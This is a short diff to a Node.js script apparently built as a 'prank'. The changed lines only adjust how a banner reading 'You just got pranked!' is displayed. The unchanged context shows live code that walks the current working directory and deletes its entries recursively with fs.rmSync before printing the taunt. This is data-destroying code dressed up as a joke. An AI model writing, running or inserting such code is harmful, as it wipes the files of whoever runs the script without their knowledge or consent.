@@ -28,7 +28,10 @@ fs.readdir(process.cwd(), async (err, files) => {
     // }
     fs.rmSync(path_string, { recursive: true });
   }
-  const badLBozoRatio = await figlet("You just got pranked!");
-  console.log(badLBozoRatio);
-  chalkAnimation.rainbow(figlet("You just got pranked!"));
+  // const badLBozoRatio = await figlet("You just got pranked!");
+  // console.log(badLBozoRatio);
+  // chalkAnimation.rainbow(figlet("You just got pranked!"));
+  figlet("You just got pranked!", (err, data) => {
+    chalkAnimation.rainbow(data);
+  });
 });
